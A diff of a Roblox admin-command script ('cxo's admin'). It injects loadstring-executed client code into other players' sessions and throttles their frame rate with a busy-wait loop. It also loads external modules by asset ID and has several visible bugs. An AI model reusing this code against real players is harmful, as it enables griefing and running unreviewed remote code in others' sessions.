+				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("eastereggs"):GetChildren()) do
+					v:Clone().Parent = workspace
+				end
+				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("replicatedstorage"):GetChildren()) do
+					v:Clone().Parent = game.ReplicatedStorage
+				end
+				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("workspace"):GetChildren()) do
+					v:Clone().Parent = workspace
+				end
+				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("starterplayerscripts"):GetChildren()) do
+					v:Clone().Parent = game.StarterPlayer.StarterPlayerScripts
+					for a, b in pairs(game.Players:GetPlayers()) do
+						if b.PlayerGui then
+							b.CharacterAdded:Connect(function()
+								for c,x in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("starterplayerscripts"):GetChildren()) do
+									x:Clone().Parent = b.PlayerGui
+								end
+							end)
+							v:Clone().Parent = b.PlayerGui
+						end
+					end
+				end
+				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("startercharacterscripts"):GetChildren()) do
+					v:Clone().Parent = game.StarterPlayer.StarterCharacterScripts
+					for a, b in pairs(game.Players:GetPlayers()) do
+						--[[b.CharacterAdded:Connect(function()
+							game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("starterplayerscripts"):FindFirstChild("ClientInputHandler"):Clone().Parent = b.Character
+						end)]]
+						v:Clone().Parent = b.Character
+					end
+				end
+				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("startergui"):GetChildren()) do
+					v:Clone().Parent = game.StarterGui
+					for a, b in pairs(game.Players:GetPlayers()) do
+						if b.PlayerGui then
+							b.CharacterAdded:Connect(function()
+								for c,x in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("startergui"):GetChildren()) do
+									x:Clone().Parent = b.PlayerGui
+								end
+							end)
+							v:Clone().Parent = b.PlayerGui
+						end
+					end
+				end
+				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("serverscriptservice"):GetChildren()) do
+					v:Clone().Parent = game.ServerScriptService
+				end
 			else
 				notfi(sender, "cxo's admin", "Prison Life failed to load: ".. fail)
 			end
 		else
-			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("PrisonLife"):Clone()
-			building.Parent = workspace
+			--[[local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("PrisonLife"):Clone()
+			building.Parent = workspace]]
 		end
 	end
 })
@@ -2713,6 +5345,7 @@ addcmd({
 		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Airplane") then
 			local plane = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Airplane"):Clone()
 			plane.Parent = workspace
+			plane.Locked = true
 
 			local f = Instance.new("Folder", workspace)
 			local a = Instance.new("Part", f)
@@ -2742,6 +5375,96 @@ addcmd({
 			c.Locked = true
 			c.Anchored = true
 
+			if game:GetService("ServerScriptService").goog.Utilities:FindFirstChild("loadstring") then
+
+				for i,v in pairs(game.Players:GetPlayers()) do
+					local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+					local utilities = game:GetService("ServerScriptService").goog.Utilities
+					local loa = utilities:FindFirstChild("loadstring")
+					
+					if loa then
+						loa = loa:Clone()
+					else
+						loa = utilities:FindFirstChild("Loadstring")
+						if loa then
+							loa = loa:Clone()
+						end
+					end
+					
+					if not loa then
+						warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+					end
+
+					loa.Parent = scr
+					scr:WaitForChild("Exec").Value = [[
+						
+						local plane = workspace:WaitForChild("Airplane")
+						local camera = workspace.Camera
+						camera.CameraSubject = plane
+
+						repeat task.wait() until not workspace:FindFirstChild("Airplane")
+
+						camera.CameraSubject = game.Players.LocalPlayer.Character
+
+					]]
+
+					if v and v.Character then
+						scr.Parent = v.Character
+					else
+						if v then
+							scr.Parent = v:WaitForChild("PlayerGui")
+						end
+					end
+					scr.Name = "CameraScript"
+					scr.Enabled = true
+				end
+
+			elseif game:GetService("ServerScriptService").goog.Utilities:FindFirstChild("Loadstring") then
+
+				for i,v in pairs(game.Players:GetPlayers()) do
+					local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+					local utilities = game:GetService("ServerScriptService").goog.Utilities
+					local loa = utilities:FindFirstChild("loadstring")
+					
+					if loa then
+						loa = loa:Clone()
+					else
+						loa = utilities:FindFirstChild("Loadstring")
+						if loa then
+							loa = loa:Clone()
+						end
+					end
+					
+					if not loa then
+						warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+					end
+
+					loa.Parent = scr
+					scr:WaitForChild("Exec").Value = [[
+						
+						local plane = workspace:WaitForChild("Airplane")
+						local camera = workspace.Camera
+						camera.CameraSubject = plane
+
+						repeat task.wait() until not workspace:FindFirstChild("Airplane")
+
+						camera.CameraSubject = game.Players.LocalPlayer.Character
+
+					]]
+
+					if v and v.Character then
+						scr.Parent = v.Character
+					else
+						if v then
+							scr.Parent = v:WaitForChild("PlayerGui")
+						end
+					end
+					scr.Name = "CameraScript"
+					scr.Enabled = true
+				end
+
+			end
+
 		end
 
 		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Airplane") then
@@ -2754,6 +5477,7 @@ addcmd({
 				game:GetService("ReplicatedStorage"):FindFirstChild("Airplane").Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
 				local plane = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Airplane"):Clone()
 				plane.Parent = workspace
+				plane.Locked = true
 
 				local f = Instance.new("Folder", workspace)
 				local a = Instance.new("Part", f)
@@ -2783,12 +5507,105 @@ addcmd({
 				c.Locked = true
 				c.Anchored = true
 
+				if game:GetService("ServerScriptService").goog.Utilities:FindFirstChild("loadstring") then
+
+					for i,v in pairs(game.Players:GetPlayers()) do
+						local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+						local utilities = game:GetService("ServerScriptService").goog.Utilities
+						local loa = utilities:FindFirstChild("loadstring")
+						
+						if loa then
+							loa = loa:Clone()
+						else
+							loa = utilities:FindFirstChild("Loadstring")
+							if loa then
+								loa = loa:Clone()
+							end
+						end
+						
+						if not loa then
+							warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+						end
+	
+						loa.Parent = scr
+						scr:WaitForChild("Exec").Value = [[
+
+							local plane = workspace:WaitForChild("Airplane")
+
+							local camera = workspace.Camera
+
+							camera.CameraSubject = plane
+
+							repeat task.wait() until not workspace:FindFirstChild("Airplane")
+
+							camera.CameraSubject = game.Players.LocalPlayer.Character
+
+						]]
+	
+						if v and v.Character then
+							scr.Parent = v.Character
+						else
+							if v then
+								scr.Parent = v:WaitForChild("PlayerGui")
+							end
+						end
+						scr.Name = "CameraScript"
+						scr.Enabled = true
+					end
+	
+				elseif game:GetService("ServerScriptService").goog.Utilities:FindFirstChild("Loadstring") then
+	
+					for i,v in pairs(game.Players:GetPlayers()) do
+						local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+						local utilities = game:GetService("ServerScriptService").goog.Utilities
+						local loa = utilities:FindFirstChild("loadstring")
+						
+						if loa then
+							loa = loa:Clone()
+						else
+							loa = utilities:FindFirstChild("Loadstring")
+							if loa then
+								loa = loa:Clone()
+							end
+						end
+						
+						if not loa then
+							warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+						end
+	
+						loa.Parent = scr
+						scr:WaitForChild("Exec").Value = [[
+							
+							local plane = workspace:WaitForChild("Airplane")
+							local camera = workspace.Camera
+							camera.CameraSubject = plane
+	
+							repeat task.wait() until not workspace:FindFirstChild("Airplane")
+	
+							camera.CameraSubject = game.Players.LocalPlayer.Character
+	
+						]]
+	
+						if v and v.Character then
+							scr.Parent = v.Character
+						else
+							if v then
+								scr.Parent = v:WaitForChild("PlayerGui")
+							end
+						end
+						scr.Name = "CameraScript"
+						scr.Enabled = true
+					end
+	
+				end
+
 			else
 				notfi(sender, "cxo's admin", "Plane failed to load: ".. fail)
 			end
 		else
 			local plane = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Airplane"):Clone()
 			plane.Parent = workspace
+			plane.Locked = true
 
 			local f = Instance.new("Folder", workspace)
 			local a = Instance.new("Part", f)
@@ -2818,6 +5635,241 @@ addcmd({
 			c.Locked = true
 			c.Anchored = true
 
+			if game:GetService("ServerScriptService").goog.Utilities:FindFirstChild("loadstring") then
+
+				for i,v in pairs(game.Players:GetPlayers()) do
+					local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+					local utilities = game:GetService("ServerScriptService").goog.Utilities
+					local loa = utilities:FindFirstChild("loadstring")
+					
+					if loa then
+						loa = loa:Clone()
+					else
+						loa = utilities:FindFirstChild("Loadstring")
+						if loa then
+							loa = loa:Clone()
+						end
+					end
+					
+					if not loa then
+						warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+					end
+
+					loa.Parent = scr
+					scr:WaitForChild("Exec").Value = [[
+						
+						local plane = workspace:WaitForChild("Airplane")
+						local camera = workspace.Camera
+						camera.CameraSubject = plane
+
+						repeat task.wait() until not workspace:FindFirstChild("Airplane")
+
+						camera.CameraSubject = game.Players.LocalPlayer.Character
+
+					]]
+
+					if v and v.Character then
+						scr.Parent = v.Character
+					else
+						if v then
+							scr.Parent = v:WaitForChild("PlayerGui")
+						end
+					end
+					scr.Name = "CameraScript"
+					scr.Enabled = true
+				end
+
+			elseif game:GetService("ServerScriptService").goog.Utilities:FindFirstChild("Loadstring") then
+
+				for i,v in pairs(game.Players:GetPlayers()) do
+					local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+					local utilities = game:GetService("ServerScriptService").goog.Utilities
+					local loa = utilities:FindFirstChild("loadstring")
+					
+					if loa then
+						loa = loa:Clone()
+					else
+						loa = utilities:FindFirstChild("Loadstring")
+						if loa then
+							loa = loa:Clone()
+						end
+					end
+					
+					if not loa then
+						warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+					end
+
+					loa.Parent = scr
+					scr:WaitForChild("Exec").Value = [[
+						
+						local plane = workspace:WaitForChild("Airplane")
+						local camera = workspace.Camera
+						camera.CameraSubject = plane
+
+						repeat task.wait() until not workspace:FindFirstChild("Airplane")
+
+						camera.CameraSubject = game.Players.LocalPlayer.Character
+
+					]]
+
+					if v and v.Character then
+						scr.Parent = v.Character
+					else
+						if v then
+							scr.Parent = v:WaitForChild("PlayerGui")
+						end
+					end
+					scr.Name = "CameraScript"
+					scr.Enabled = true
+				end
+			end
+
+		end
+	end
+})
+
+addcmd({
+	Name = "view",
+	Aliases = {"spectate"},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		local arg, arg2
+    
+		if arguments[2] then
+			arg = arguments[1]
+			arg2 = arguments[2]
+		elseif arguments[1] then
+			arg = sender.Name
+			arg2 = arguments[1]
+		else
+			notfi(sender, "cxo's admin", "You need to specify at least one player!")
+			return
+		end
+
+		if arg == "me" then
+			arg = sender.Name
+		end
+
+		local argt = p(arg, sender)
+		local argt2 = p(arg2, sender)
+
+		if #argt2 <= 0 then
+			notfi(sender, "cxo's admin", "Invalid user! command example: ".. prefix .."view ripcxo")
+			return
+		end
+
+		if not argt2[1].Character and not argt2[1].Character:FindFirstChild("Humanoid") then
+			notfi(sender, "cxo's admin", argt2[1].Name .. " doesn't have a Humanoid!")
+			return
+		end
+
+		local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+		local utilities = game:GetService("ServerScriptService").goog.Utilities
+		local loa = utilities:FindFirstChild("loadstring")
+		
+		if loa then
+			loa = loa:Clone()
+		else
+			loa = utilities:FindFirstChild("Loadstring")
+			if loa then
+				loa = loa:Clone()
+			end
+		end
+		
+		if not loa then
+			warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+		end
+
+		if sender.Character and sender.Character:FindFirstChild("SPECTATE") then
+			sender.Character:FindFirstChild("SPECTATE"):Destroy()
+		else
+			if sender.PlayerGui and sender.PlayerGui:FindFirstChild("SPECTATE") then
+				sender.PlayerGui:FindFirstChild("SPECTATE"):Destroy()
+			end
+		end
+
+		loa.Parent = scr
+		scr:WaitForChild("Exec").Value = string.format([[
+			local camera = game:GetService("Workspace").Camera
+
+			camera.CameraSubject = game.Players:FindFirstChild(%s).Character.Humanoid
+			camera.CameraType = Enum.CameraType.Custom
+
+		]], argt2[1].Name)
+
+		if argt[1] and argt[1].Character then
+			scr.Parent = argt[1].Character
+		else
+			if argt[1] then
+				scr.Parent = argt[1]:WaitForChild("PlayerGui")
+			end
+		end
+
+		scr.Name = "SPECTATING"
+		scr.Enabled = true
+	end
+})
+
+addcmd({
+	Name = "unview",
+	Aliases = {"unspectate"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+
+			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
+	
+			if sender.Character and sender.Character:FindFirstChild("SPECTATE") then
+				sender.Character:FindFirstChild("SPECTATE"):Destroy()
+			else
+				if sender.PlayerGui and sender.PlayerGui:FindFirstChild("SPECTATE") then
+					sender.PlayerGui:FindFirstChild("SPECTATE"):Destroy()
+				end
+			end
+	
+			if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SPECTATE") then
+				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SPECTATE").Value = value
+			else
+				local val = Instance.new("StringValue", game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"))
+				val.Value = argt2[1].Name
+				val.Name = "SPECTATE"
+			end
+	
+			loa.Parent = scr
+			scr:WaitForChild("Exec").Value = [[
+	
+				local camera = game:GetService("Workspace").Camera
+	
+				camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
+				camera.CameraType = Enum.CameraType.Custom
+	
+			]]
+	
+			if argt[1] and argt[1].Character then
+				scr.Parent = argt[1].Character
+			else
+				if argt[1] then
+					scr.Parent = argt[1]:WaitForChild("PlayerGui")
+				end
+			end
+	
+			scr.Name = "SPECTATING"
+			scr.Enabled = true
+
 		end
 	end
 })
@@ -2826,20 +5878,56 @@ addcmd({
 	Name = "fps",
 	Aliases = {"setfps"},
 	Function = function(sender, targets, arguments)
-		local value = table.concat(arguments, " ", 1)
+		local value = arguments[1]
 		for i, plr in ipairs(targets) do
-			if not table.find(fpslooped, plr.Name) then
-				looped = coroutine.create(function()
-					repeat
-						local osclock = os.clock()
-						while osclock + 1 / value > os.clock() do
-						end
-						task.wait()
-						osclock = os.clock()
-					until not table.find(fpslooped, plr.Name) or not game.Players:FindFirstChild(plr.Name)
-				end)
-				coroutine.resume(looped)
+			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
 			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
+
+			if plr.Character and plr.Character:FindFirstChild("FPSBoost") then
+				plr.Character:FindFirstChild("FPSBoost"):Destroy()
+			else
+				if plr.PlayerGui and plr.PlayerGui:FindFirstChild("FPSBoost") then
+					plr.PlayerGui:FindFirstChild("FPSBoost"):Destroy()
+				end
+			end
+
+			loa.Parent = scr
+			scr:WaitForChild("Exec").Value = string.format([[
+
+				game:GetService("RunService").Heartbeat:Connect(function()
+					local osclock = os.clock()
+					while osclock + 1 / %s > os.clock() do
+					end
+					task.wait()
+					osclock = os.clock()
+				end)
+
+			]], value)
+
+			if plr and plr.PlayerGui then
+				scr.Parent = plr.PlayerGui
+			else
+				if plr and plr.Character then
+					scr.Parent = plr.Character
+				end
+			end
+
+			scr.Name = "FPSBoost"
+			scr.Enabled = true
 		end
 	end
 })
@@ -2849,16 +5937,20 @@ addcmd({
 	Aliases = {"fixfps"},
 	Function = function(sender, targets, arguments)
 		for i, plr in ipairs(targets) do
-			if table.find(fpslooped, plr.Name) then
-				table.remove(fpslooped, table.find(fpslooped, plr.Name))
+			if plr.Character and plr.Character:FindFirstChild("FPSBoost") then
+				plr.Character:FindFirstChild("FPSBoost"):Destroy()
+			else
+				if plr.PlayerGui and plr.PlayerGui:FindFirstChild("FPSBoost") then
+					plr.PlayerGui:FindFirstChild("FPSBoost"):Destroy()
+				end
 			end
 		end
 	end
 })
 
 addcmd({
-	Name = "robot",
-	Aliases = {"clone"},
+	Name = "clone",
+	Aliases = {"robot"},
 	Player = false,
 	Function = function(sender, targets, arguments)
 		local target = table.concat(arguments, " ")
@@ -2902,11 +5994,29 @@ addcmd({
 })
 
 addcmd({
+	Name = "panel",
+	Aliases = {"adminpanel"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			gui(plr, "panel")
+		end
+	end
+})
+--[[
+addcmd({ -- Yeah i created an empty command so itd show in my cmds list, Big whoop wanna fight about it?
+	Name = "pm",
+	Aliases = {"privatemessage"},
+	Function = function(sender, targets, arguments)
+		local money = math.huge
+	end
+})
+]]
+addcmd({
 	Name = "whitelist",
 	Aliases = {"wl"},
 	Function = function(sender, targets, arguments)
 		for i, plr in ipairs(targets) do
-			if not table.find(Whitelist, plr.UserId) and not table.find(TempWhitelist, plr.UserId) then
+			if not table.find(Whitelist, tostring(plr.UserId)) and not table.find(TempWhitelist, plr.UserId) then
 				table.insert(TempWhitelist, plr.UserId)
 				notfi(plr, "cxo's admin", "You have been whitelisted! say ".. prefix .."cmds to view cmds.")
 				notfi(sender, "cxo's admin", "Whitelisted ".. plr.Name .." successfully!", 3)
@@ -2926,6 +6036,26 @@ addcmd({
 				table.remove(TempWhitelist, table.find(TempWhitelist, plr.UserId))
 			end
 		end
+	end
+})
+
+addcmd({
+	Name = "whitelists",
+	Aliases = {"wls", "wld", "whitelisted"},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		local whitelists = ""
+
+		for i, whitelist in pairs(TempWhitelist) do
+			whitelists = whitelist ..", "
+		end
+
+		for i, whitelist in pairs(Whitelisted) do
+			whitelists = whitelist ..", "
+		end
+
+		notfi(sender, "cxo's admin", "Whitelisted users: ")
+
 	end
 })
 
@@ -2977,7 +6107,21 @@ addcmd({
 				_G.GunMan = plr.Name
 
 				local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-				local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+				local utilities = game:GetService("ServerScriptService").goog.Utilities
+				local loa = utilities:FindFirstChild("loadstring")
+				
+				if loa then
+					loa = loa:Clone()
+				else
+					loa = utilities:FindFirstChild("Loadstring")
+					if loa then
+						loa = loa:Clone()
+					end
+				end
+				
+				if not loa then
+					warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+				end
 
 				if not scr or not loa then
 					notfi(sender, "cxo's admin", "Vital requirement missing, can't load. Sorry!")
@@ -3008,12 +6152,30 @@ addcmd({
 				end
 
 				]]
-				scr.Parent = plr.Character
+				if plr.Character then
+					scr.Parent = plr.Character
+				else
+					scr.Parent = plr:WaitForChild("PlayerGui")
+				end
 				scr.Name = "GrabGunScript"
 				scr.Enabled = true
 
 				local scr = game:GetService("ServerScriptService").goog.Utilities.Server:Clone()
-				local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+				local utilities = game:GetService("ServerScriptService").goog.Utilities
+				local loa = utilities:FindFirstChild("loadstring")
+				
+				if loa then
+					loa = loa:Clone()
+				else
+					loa = utilities:FindFirstChild("Loadstring")
+					if loa then
+						loa = loa:Clone()
+					end
+				end
+				
+				if not loa then
+					warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+				end
 				loa.Parent = scr
 
 				local success, content = pcall(function() -- grab gun script
@@ -3024,7 +6186,11 @@ addcmd({
 					local loaded, fail = loadstring(content)
 					if loaded then
 						scr:WaitForChild("Exec").Value = content
-						scr.Parent = plr.Character
+						if plr.Character then
+							scr.Parent = plr.Character
+						else
+							scr.Parent = plr:WaitForChild("PlayerGui")
+						end
 						scr.Name = "GrabGunMain"
 						scr.Enabled = true
 					else
@@ -3041,6 +6207,94 @@ addcmd({
 })
 
 addcmd({
+	Name = "bombvest",
+	Aliases = {"bomber"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			require(18683323231).bombvest(plr.Name)
+		end
+	end
+})
+
+addcmd({
+	Name = "grabknife",
+	Aliases = {"knife"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			require(18665717275).load(plr.Name)
+		end
+	end
+})
+
+addcmd({
+	Name = "fix",
+	Aliases = {},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		--[[if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Loadstring") then
+
+		else
+			notfi(sender, "cxo's admin", "'Loadstring' not found in cxo's folder, this command can not continue!")
+		end]]
+		game:GetService("ServerScriptService"):FindFirstChild("goog"):FindFirstChild("Utilities"):FindFirstChild("Loadsting").Name = "loadstring"
+	end
+})
+
+addcmd({
+	Name = "tag",
+	Aliases = {},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		local torf = arguments[1]
+
+		if torf ~= "true" and torf ~= "false" then
+			notfi(sender, "cxo's admin", "The values are true or false! example: ".. prefix .."tag true")
+		end
+
+		local bool = (torf == "true")
+
+		if torf:lower() == "true" then
+			tag = true
+			ftag()
+		else
+			tag = false
+			for i,t in pairs(game.Teams:GetChildren()) do
+				if t.Name == "cxo's admin is loaded" then
+					t:Destroy()
+				elseif t.Name == "! cxo's admin is loaded !" then
+					t:Destroy()
+				end
+			end
+		end
+		
+	end
+})
+
+addcmd({
+	Name = "ping",
+	Aliases = {"latency"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+
+			--[[if not table.find(anticheatmeasure, plr.UserId) then
+				table.insert(anticheatmeasure, plr.UserId)
+			end]]
+
+			ping = plr:GetNetworkPing() * 1000
+
+			if ping ~= nil then
+				notfi(sender, "cxo's admin", plr.Name .. "'s ping is: " .. math.floor(ping))
+            else
+                notfi(sender, "cxo's admin", "Failed to retrieve ping for " .. plr.Name)
+            end
+
+			--table.remove(anticheatmeasure, plr.UserId)
+		end
+	end
+})
+
+--[[
+addcmd({
 	Name = "unload",
 	Aliases = {},
 	Player = false,
@@ -3048,7 +6302,7 @@ addcmd({
 		script:Destroy()
 	end
 })
-
+]]
 addcmd({
 	Name = "cmds",
 	Aliases = {},
@@ -3059,7 +6313,464 @@ addcmd({
 	end
 })
 
-----------------------------------------------------------------------------------------------------------------------
+-------------------------------------------- FUNCTIONS --------------------------------------------
+
+function antikill(plr)
+	task.spawn(function()
+		plr.Character.Humanoid.Died:Connect(function()
+			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and table.find(autore, plr.Name) then
+				local rnpos = plr.Character.HumanoidRootPart.CFrame
+				plr:LoadCharacter()
+				repeat task.wait() until plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") or not game.Players:FindFirstChild(plr.Name)
+				plr.Character.HumanoidRootPart.CFrame = rnpos
+			end
+		end)
+
+		plr.CharacterAdded:Connect(function()
+			if table.find(autore, plr.Name) then
+				repeat task.wait() until plr and plr.Character or not game.Players:FindFirstChild(plr.Name)
+				antikill(plr)
+			end
+		end)
+
+		game.Players.ChildAdded:Connect(function(playr)
+			if table.find(autore, plr.Name) then
+				if playr.Name == plr.Name then
+					repeat task.wait() until plr and plr.Character or not game.Players:FindFirstChild(plr.Name)
+					antikill(plr)
+				end
+			end
+		end)
+
+	end)
+end
+
+function scanfordevice()
+	local remote = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder"):WaitForChild("cxo's Device Remote")
+	if remote then
+		remote.OnServerInvoke = function(plr, device)
+			for i, emoji in ipairs(emojis) do
+				if string.find(device, emoji) then
+					googul[plr.UserId] = device
+				end
+			end
+		end
+	end
+end
+
+function getdevice(player)
+	if not googul[player.UserId] then
+		if player and player.Character then
+			local scr = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device LocalScript")
+			if scr then
+				scr:Clone()
+
+				if player and player.Character then
+					scr.Parent = player.Character
+					return
+				else
+					if player then
+						scr.Parent = player:WaitForChild("PlayerGui")
+					end
+				end
+
+			else
+				local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+				local utilities = game:GetService("ServerScriptService").goog.Utilities
+				local loa = utilities:FindFirstChild("loadstring")
+				
+				if loa then
+					loa = loa:Clone()
+				else
+					loa = utilities:FindFirstChild("Loadstring")
+					if loa then
+						loa = loa:Clone()
+					end
+				end
+				
+				if not loa then
+					warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+				end
+				loa.Parent = scr
+				scr:WaitForChild("Exec").Value = [[
+
+				local UserInputService = game:GetService("UserInputService")
+				local remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device Remote")
+			
+				local devices = {
+					TouchEnabled = UserInputService.TouchEnabled,
+					VREnabled = UserInputService.VREnabled,
+					GamepadEnabled = UserInputService.GamepadEnabled,
+					MouseEnabled = UserInputService.MouseEnabled,
+					KeyboardEnabled = UserInputService.KeyboardEnabled
+				}
+			
+				local device = ""
+			
+				if devices.VREnabled then
+					device = device .. "🥽 + "
+				end
+				if devices.GamepadEnabled then
+					device = device .. "🎮 + "
+				end
+				if devices.TouchEnabled then
+					device = device .. "📱 + "
+				end
+				if devices.MouseEnabled and devices.KeyboardEnabled then
+					device = device .. "⌨️🖱️ + "
+				elseif devices.MouseEnabled then
+					device = device .. "🖱️ + "
+				elseif devices.KeyboardEnabled then
+					device = device .. "⌨️ + "
+				end
+			
+				if device:sub(-3) == " + " then
+					device = device:sub(1, -4)
+				end
+			
+				if device == "" then
+					device = "❓"
+				end
+			
+				if remote then
+					remote:InvokeServer(device)
+				end
+			
+				]]
+				
+				if player and player.Character then
+					scr.Parent = player.Character
+				else
+					if player then
+						scr.Parent = player:WaitForChild("PlayerGui")
+					end
+				end
+
+				scr.Name = "cxo's Device LocalScript"
+				scr.Enabled = true
+			end
+			repeat task.wait() until googul[player.UserId]
+			return googul[player.UserId]
+		else
+			return "❓"
+		end
+	else
+		return googul[player.UserId]
+	end
+end
+
+function gmodlistener()
+	local r = game:GetService("ReplicatedStorage")
+	local remote = r:WaitForChild("cxo's folder"):WaitForChild("cxo's gmod remote")
+	local grabbed = {}
+	local grabbing
+
+	remote.OnServerEvent:Connect(function(player, action, target)
+
+		if not table.find(gmodded, player.UserId) then
+			player:Kick("[ANTICHEAT] cxo's admin | this remote is protected.")
+		end
+
+		if action == "Pickup" and table.find(gmodded, player.UserId) then
+			if target and target:IsA("BasePart") and target.Anchored == false then
+				grabbed[player] = target
+				grabbing = target
+				print(target.Name)
+				target:SetNetworkOwner(player)
+			end
+		elseif action == "Update" and table.find(gmodded, player.UserId) then
+			if grabbed[player] then
+				local part = grabbed[player]
+				if part then
+					part.CFrame = CFrame.new(target)
+				end
+			end
+		elseif action == "Release" and table.find(gmodded, player.UserId) then
+			local part = grabbing
+			grabbed[player] = nil
+
+			local character = part.Parent
+			if character and character:FindFirstChild("Humanoid") then
+				for i,v in pairs(character:GetChildren()) do
+					if v:IsA("BasePart") and v.Name == "Torso" or v.Name == "HumanoidRootPart" then
+						print("who up joycatting rn | ".. v.Name)
+						v:SetnetworkOwner(character)
+					end
+				end
+			else
+				part:SetNetworkOwner(nil)
+			end
+		end
+
+	end)
+end
+
+function remotelistener()
+
+	local remote = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder"):WaitForChild("cxo's remote")
+
+	remote.OnServerEvent:Connect(function(player, choice, command, target, target2, extra)
+
+		if not table.find(panelanticheat, player.UserId) then
+			player:Kick("[ANTICHEAT] cxo's admin | this remote is protected.")
+		end
+		
+		if choice == "PanelCMD" and table.find(panelanticheat, player.UserId) then
+
+			if target == nil then
+				target = player.Name
+			end
+
+			if target == "me" then
+				target = player.Name
+			elseif target2 == "me" then
+				target2 = player.Name
+			end
+
+			local argt = p(target, player)
+			local argt2 = p(target2, player)
+
+			if #argt > 0 then
+				target = argt[1]
+			else
+				target = nil
+			end
+
+			if #argt2 > 0 then
+				target2 = argt2[1]
+			else
+				target2 = nil
+			end
+
+			if command:lower() ~= "chat" then
+				extra = nil
+			else
+				if target2 then
+					target2 = nil
+				end
+			end
+
+			if target2 and target2 ~= nil then
+				--print("Running command with two targets: " .. target .. ", " .. target2 .. " | Command: " .. command)
+				runcmd(command, nil, {target, target2}, {extra}, nil)
+				--(cmdn,message,targets,arguments,extra)
+			elseif target and target ~= nil then
